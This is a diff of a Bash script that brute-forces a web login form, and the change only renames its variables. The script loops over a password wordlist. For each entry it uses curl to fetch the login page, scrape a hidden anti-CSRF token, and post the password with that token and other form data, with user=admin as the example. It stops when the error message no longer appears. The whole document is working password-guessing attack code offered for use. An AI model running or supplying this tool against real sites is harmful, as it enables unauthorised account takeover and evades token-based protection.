@@ -4,12 +4,12 @@
 #
 
 # Example
-#formpage="http://mypage.com/login/index.php"
-#token_tag="token"
-#passwd_tag="pass"
-#otherdata="user=admin&submit=Send"
-#filename="/usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt"
-#error_msg="Incorrect user or password" 
+#form_page="http://mypage.com/login/index.php"
+#token_name="token"
+#passsword_name="pass"
+#other_post_data="user=admin&submit=Send"
+#wordlist="/usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt"
+#error_message="Incorrect user or password" 
 
 # Usage
 
@@ -32,23 +32,23 @@ then
 	exit
 fi
 
-formpage="$1"
-token_tag="$2"
-passwd_tag="$3"
-otherdata="$4"
-filename="$5"
-error_msg="$6"
+form_page="$1"
+token_name="$2"
+passsword_name="$3"
+other_post_data="$4"
+wordlist="$5"
+error_message="$6"
 
 while read line
 do
 	passwd=$line
 
 	# Change this line to get token
-	token=$(curl -s -c cookies.txt "${formpage}" | grep hidden | grep "${token_tag}" | grep -Pio 'value="\K[^"]*')
+	token=$(curl -s -c cookies.txt "${form_page}" | grep hidden | grep "${token_name}" | grep -Pio 'value="\K[^"]*')
 
-	output=$(curl -s -b cookies.txt "${formpage}" --data-raw "${passwd_tag}=${passwd}&${token_tag}=${token}&${otherdata}")
+	output=$(curl -s -b cookies.txt "${form_page}" --data-raw "${passsword_name}=${passwd}&${token_name}=${token}&${other_post_data}")
 
-	if [[ "$output" =~ "$error_msg" ]]
+	if [[ "$output" =~ "$error_message" ]]
 	then
 		echo -n "."
 	else
@@ -57,6 +57,6 @@ do
 		exit
 	fi
 
-done < $filename
+done < $wordlist
 
 rm cookies.txt
